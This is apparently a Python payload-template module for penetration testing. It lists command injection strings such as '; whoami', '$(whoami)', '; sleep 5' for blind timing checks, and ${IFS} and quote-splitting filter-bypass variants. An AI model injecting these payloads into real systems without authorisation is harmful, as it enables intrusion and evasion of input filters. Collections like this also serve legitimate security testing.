"""
Command Injection Payload Templates
Educational – Templates only
"""

from typing import List, Dict


class CMDIPayloads:

    def get_basic(self) -> List[Dict]:
        return [
            {"payload": "; whoami", "context": "parameter"},
            {"payload": "&& id", "context": "parameter"},
            {"payload": "| uname -a", "context": "parameter"},
            {"payload": "`whoami`", "context": "inline"},
            {"payload": "$(whoami)", "context": "inline"},
        ]

    def get_blind(self) -> List[Dict]:
        return [
            {"payload": "; sleep 5", "context": "time-based"},
            {"payload": "&& ping -c 5 127.0.0.1", "context": "time-based"},
        ]

    def get_filter_bypass(self) -> List[Dict]:
        return [
            {"payload": ";${IFS}whoami", "context": "space-bypass"},
            {"payload": "`w'h'o'am'i`", "context": "quote-bypass"},
        ]

    def get_all(self) -> List[Dict]:
        return (
            self.get_basic()
            + self.get_blind()
            + self.get_filter_bypass()
        )
